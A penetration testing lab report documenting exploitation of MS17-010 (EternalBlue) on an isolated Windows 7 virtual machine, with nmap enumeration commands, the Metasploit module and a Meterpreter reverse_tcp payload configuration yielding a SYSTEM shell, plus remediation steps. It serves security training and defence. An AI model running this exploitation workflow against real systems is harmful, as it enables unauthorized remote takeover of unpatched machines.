# Penetration Testing Report

# MS17-010 (EternalBlue) Exploitation Lab

---

# Executive Summary

A penetration test was conducted against a Windows 7 Professional SP1 virtual machine within an isolated VMware Host-Only network.

The objective was to identify remotely exploitable vulnerabilities and validate their impact.

The assessment identified the MS17-010 (EternalBlue) vulnerability affecting the SMBv1 service. Successful exploitation resulted in a Meterpreter session running with NT AUTHORITY\SYSTEM privileges.

---

# Scope

## Attacker

- Kali Linux

## Target

- Windows 7 Professional SP1 x64

---

# Network Configuration

| Device | IP Address |
|----------|------------|
| Kali Linux | 192.168.243.128 |
| Windows 7 | 192.168.243.131 |

---

# Methodology

The assessment followed a standard penetration testing methodology.

- Reconnaissance
- Enumeration
- Vulnerability Identification
- Exploitation
- Post-Exploitation
- Documentation

---

# Phase 1 — Reconnaissance

## Objective

Verify communication with the target.

## Commands

```bash
ping -c 4 192.168.243.131

sudo arp-scan 192.168.243.0/24

sudo nmap -sn 192.168.243.131
```

## Results

- Target reachable
- Host discovered successfully
- VMware virtual machine identified

---

# Phase 2 — Service Enumeration

## Objective

Identify exposed network services.

## Command

```bash
sudo nmap -sV -O 192.168.243.131
```

## Findings

| Port | Service |
|-------|---------|
|135|MSRPC|
|139|NetBIOS|
|445|SMB|
|49152-49157|RPC|

Operating System:

Windows 7 Professional SP1 x64

---

# Phase 3 — SMB Enumeration

## Objective

Collect SMB-related information.

## Command

```bash
sudo nmap --script smb-os-discovery,smb-enum-shares -p445 192.168.243.131
```

## Findings

- SMB service detected
- Anonymous access denied to administrative shares
- IPC$ accessible with limited permissions
- Workgroup: WORKGROUP

---

# Phase 4 — Vulnerability Identification

## Objective

Determine whether SMB is vulnerable to MS17-010.

## Command

```bash
sudo nmap --script smb-vuln-ms17-010 -p445 192.168.243.131
```

## Findings

Vulnerability detected:

- MS17-010
- CVE-2017-0143
- Risk Level: High

The target was confirmed vulnerable to remote code execution through SMBv1.

---

# Phase 5 — Exploitation

## Exploit

Metasploit Framework

Module:

```
exploit/windows/smb/ms17_010_eternalblue
```

Payload:

```
windows/x64/meterpreter/reverse_tcp
```

Configuration:

```
RHOSTS = 192.168.243.131

LHOST = 192.168.243.128
```

## Result

Exploitation completed successfully.

Evidence:

- Meterpreter session established.
- Remote code execution achieved.

---

# Phase 6 — Post-Exploitation

## Commands

```text
getuid

sysinfo

getpid

pwd
```

## Results

Current User

```
NT AUTHORITY\SYSTEM
```

Operating System

```
Windows 7 Professional SP1
```

Architecture

```
x64
```

Working Directory

```
C:\Windows\System32
```

---

# Security Impact

The identified vulnerability allows an unauthenticated attacker to execute arbitrary code remotely through SMBv1.

Successful exploitation grants complete control over the operating system.

Risk Level:

**Critical**

---

# Remediation

- Apply Microsoft's MS17-010 security update.
- Disable SMBv1 where possible.
- Restrict access to TCP port 445.
- Implement network segmentation.
- Monitor SMB activity.
- Maintain regular security patching.

---

# Conclusion

The assessment successfully demonstrated the complete penetration testing workflow against a vulnerable Windows 7 system.

Starting from network discovery and service enumeration, the engagement progressed through vulnerability identification and successful exploitation of MS17-010 using Metasploit Framework.

The exploit resulted in a Meterpreter session running with NT AUTHORITY\SYSTEM privileges, confirming full compromise of the target system.
